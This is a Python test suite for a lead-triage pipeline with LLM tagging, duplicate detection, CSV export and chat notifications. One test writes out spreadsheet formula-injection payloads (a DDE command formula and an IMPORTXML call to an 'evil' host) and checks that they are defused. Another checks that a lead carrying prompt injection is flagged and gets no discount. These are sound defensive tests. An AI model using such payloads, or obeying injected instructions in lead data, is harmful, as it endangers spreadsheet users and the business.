"""End-to-end test on the real sample data, in a temp dir. Asserts the outcome for every lead."""
import csv
import json
import shutil
import tempfile
import unittest
from pathlib import Path

from leadflow.config import ROOT, Config
from leadflow.llm import Triager
from leadflow.notify import Notifier, slack_escape
from leadflow.pipeline import Pipeline
from leadflow.store import Store

EXPECTED = {  # source id -> (outcome, tag or None, matched/created note)
    "S-01": ("added", "Hot"), "S-02": ("duplicate", None), "S-03": ("duplicate", None),
    "S-04": ("rejected", None), "S-05": ("added", "Warm"), "S-06": ("rejected", None),
    "S-07": ("added", "Warm"), "S-08": ("added", "Cold"), "S-09": ("added", "Hot"),
    "S-10": ("added", "Cold"), "S-11": ("spam", None), "S-12": ("added", "Warm"),
    "S-13": ("added", "Cold"), "S-14": ("duplicate", None), "S-15": ("duplicate", None),
}


def make_cfg(tmp: Path, **kw) -> Config:
    base = dict(existing_csv=ROOT / "data" / "existing_leads.csv", incoming_json=ROOT / "data" / "incoming_leads.json",
                out_dir=tmp, company_name="Jeevit", default_region="GB", llm_provider="stub", llm_api_key="",
                llm_model="", llm_base_url="", slack_webhook="", telegram_token="", telegram_chat_id="", webhook_secret="")
    return Config(**{**base, **kw})


def run_batch(cfg, leads):
    store = Store(cfg)
    p = Pipeline(cfg, store, Triager(cfg), Notifier(cfg), run_id="test")
    return p, [p.process(x) for x in leads]


class PipelineTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = make_cfg(self.tmp)
        self.leads = json.loads(self.cfg.incoming_json.read_text(encoding="utf-8"))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_every_sample_lead_gets_the_expected_outcome(self):
        p, results = run_batch(self.cfg, self.leads)
        for r in results:
            outcome, tag = EXPECTED[r.source_id]
            self.assertEqual(r.outcome, outcome, r.source_id)
            if tag:
                self.assertEqual(r.tag, tag, r.source_id)
        self.assertEqual(len(p.store.rows), 12 + 8)  # 12 existing + 8 added

    def test_duplicates_and_escalation(self):
        p, results = run_batch(self.cfg, self.leads)
        by = {r.source_id: r for r in results}
        self.assertEqual(by["S-02"].lead_id, "L-1001")
        self.assertEqual(by["S-03"].lead_id, "L-1002")
        self.assertEqual(by["S-14"].lead_id, by["S-12"].lead_id)  # within-batch dup
        self.assertEqual(by["S-15"].lead_id, "L-1008")  # plus-alias dup
        self.assertEqual(p.store.get_row("L-1008")["tag"], "Hot")  # escalated Warm -> Hot
        self.assertEqual(p.store.get_row("L-1002")["tag"], "Hot")  # never downgraded by the Cold follow-up
        hot_ids = [json.loads(l)["lead_id"] for l in (self.tmp / "notifications.jsonl").read_text().splitlines()]
        self.assertEqual(sorted(hot_ids), ["L-1008", "L-1013", "L-1017"])

    def test_injection_lead_is_cold_with_safe_reply_and_no_notification(self):
        p, _ = run_batch(self.cfg, self.leads)
        row = next(r for r in p.store.rows if r["source_id"] == "S-10")
        self.assertEqual(row["tag"], "Cold")
        self.assertIn("prompt_injection_suspected", row["flags"])
        self.assertNotIn("discount", row["draft_reply"].lower())

    def test_rerun_is_idempotent(self):
        p, _ = run_batch(self.cfg, self.leads)
        before = (self.tmp / "leads.csv").read_text(encoding="utf-8")
        p2, results = run_batch(self.cfg, self.leads)
        self.assertTrue(all(r.outcome == "skipped" for r in results))
        self.assertEqual((self.tmp / "leads.csv").read_text(encoding="utf-8"), before)

    def test_bad_payloads_are_isolated(self):
        junk = [None, "a string", 42, {"name": "no id"}, {"id": "J-1", "email": "x@y.co", "name": ["list"]}]
        p, results = run_batch(self.cfg, junk + [self.leads[0]])
        self.assertEqual(results[-1].outcome, "added")  # the good lead after the junk still works
        self.assertTrue(all(r.outcome in ("rejected", "error", "added") for r in results))
        self.assertEqual(p.store.export_review_queue() >= 4, True)

    def test_original_sheet_columns_are_preserved_and_input_untouched(self):
        original = self.cfg.existing_csv.read_text(encoding="utf-8")
        run_batch(self.cfg, self.leads)
        self.assertEqual(self.cfg.existing_csv.read_text(encoding="utf-8"), original)
        header = (self.tmp / "leads.csv").read_text(encoding="utf-8").splitlines()[0].split(",")
        self.assertEqual(header[:7], ["lead_id", "name", "email", "company", "source", "tag", "created_at"])

    def test_spreadsheet_formula_in_message_is_defused(self):
        evil = {"id": "E-1", "name": "Eve", "email": "eve@corp.com", "company": "=cmd|' /C calc'!A0",
                "message": "=IMPORTXML(\"http://evil\",\"//a\") we need help"}
        p, _ = run_batch(self.cfg, [evil])
        row = p.store.rows[-1]
        self.assertTrue(row["company"].startswith("'=") and row["message"].startswith("'="))

    def test_failing_notification_channel_is_visible_not_fatal(self):
        cfg = make_cfg(self.tmp, slack_webhook="http://127.0.0.1:1/unreachable")
        p, results = run_batch(cfg, self.leads[:1])
        self.assertEqual(results[0].outcome, "added")  # lead kept
        self.assertIn("notify failed: slack", results[0].notes)
        p.store.export_review_queue()
        rows = list(csv.DictReader(open(self.tmp / "review_queue.csv", encoding="utf-8")))
        self.assertTrue(any(r["outcome"] == "notify_failed" for r in rows))

    def test_slack_escape(self):
        self.assertEqual(slack_escape("<!channel> a&b"), "&lt;!channel&gt; a&amp;b")


if __name__ == "__main__":
    unittest.main()
